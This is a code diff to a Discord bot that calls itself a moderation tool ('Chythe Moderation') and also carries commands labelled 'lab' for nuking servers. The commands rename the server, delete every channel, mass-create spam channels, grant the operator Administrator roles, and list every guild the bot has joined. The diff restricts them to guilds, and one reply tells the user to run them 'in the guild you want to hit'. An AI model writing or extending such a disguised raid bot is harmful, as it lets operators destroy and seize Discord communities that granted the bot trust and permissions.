@@ -22,6 +22,10 @@ app.listen(port, '0.0.0.0', () => console.log(`Health server listening on ${port
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
+// lock every command to guild-only (no DM usage)
+const guildOnly = (b) =>
+  typeof b.setDMPermission === 'function' ? b.setDMPermission(false) : b;
+
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 async function safe(fn, label) {
@@ -38,35 +42,35 @@ async function safe(fn, label) {
 }
 
 const commands = [
-  new SlashCommandBuilder().setName('setup')
+  guildOnly(new SlashCommandBuilder().setName('setup')
     .setDescription('Open the moderation setup panel')
-    .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild),
-  new SlashCommandBuilder().setName('purge')
+    .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild)),
+  guildOnly(new SlashCommandBuilder().setName('purge')
     .setDescription('Clean recent messages using Discord-supported batches')
     .addIntegerOption(o => o.setName('amount').setDescription('1-10000 messages').setMinValue(1).setMaxValue(10000).setRequired(true))
     .addBooleanOption(o => o.setName('keep_media').setDescription('Keep messages containing image/file attachments'))
-    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),
+    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages)),
 
   // --- lab commands, owner-only ---
-  new SlashCommandBuilder().setName('nuke')
+  guildOnly(new SlashCommandBuilder().setName('nuke')
     .setDescription('Full lab sequence: rename в†’ delete в†’ spam в†’ admin role (runs in current guild)')
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-  new SlashCommandBuilder().setName('spam')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
+  guildOnly(new SlashCommandBuilder().setName('spam')
     .setDescription('Mass-create haveibeenpwned channels (runs in current guild)')
     .addIntegerOption(o => o.setName('count').setDescription('How many channels').setMinValue(1).setMaxValue(2000).setRequired(true))
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-  new SlashCommandBuilder().setName('wipe')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
+  guildOnly(new SlashCommandBuilder().setName('wipe')
     .setDescription('Delete every channel in the current guild')
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-  new SlashCommandBuilder().setName('admin')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
+  guildOnly(new SlashCommandBuilder().setName('admin')
     .setDescription('Create owner role with Administrator and assign to you (current guild)')
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-  new SlashCommandBuilder().setName('coowner')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
+  guildOnly(new SlashCommandBuilder().setName('coowner')
     .setDescription('Create a Co-Owner role (near-admin) and assign it to you (current guild)')
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-  new SlashCommandBuilder().setName('guilds')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
+  guildOnly(new SlashCommandBuilder().setName('guilds')
     .setDescription('List every guild this bot is a member of')
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)),
 ].map(c => c.toJSON());
 
 client.once('ready', async () => {
@@ -161,6 +165,8 @@ client.on('interactionCreate', async interaction => {
   try {
     // ---- moderation commands (original) ----
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup') {
+      if (!interaction.guild)
+        return interaction.reply({ content: 'Run this in a server.', ephemeral: true });
       const embed = new EmbedBuilder().setTitle('Chythe Moderation')
         .setDescription('Use the controls below to check bot status and required permissions.')
         .setColor(0x5865f2);
@@ -172,6 +178,8 @@ client.on('interactionCreate', async interaction => {
     }
 
     if (interaction.isChatInputCommand() && interaction.commandName === 'purge') {
+      if (!interaction.guild)
+        return interaction.reply({ content: 'Run this in a server.', ephemeral: true });
       if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageMessages))
         return interaction.reply({ content: 'You need Manage Messages.', ephemeral: true });
       if (!interaction.channel?.permissionsFor(interaction.guild.members.me)?.has(PermissionFlagsBits.ManageMessages))
@@ -204,8 +212,12 @@ client.on('interactionCreate', async interaction => {
       }
 
       const guild = interaction.guild;
-      if (!guild)
-        return interaction.reply({ content: 'ratman4080: no guild context.', ephemeral: true });
+      if (!guild) {
+        return interaction.reply({
+          content: 'ratman4080: this command only works inside a server. Run it in the guild you want to hit.',
+          ephemeral: true
+        });
+      }
 
       if (interaction.commandName === 'nuke') {
         await interaction.reply({ content: `ratman4080: sequence started in **${guild.name}**.`, ephemeral: true });
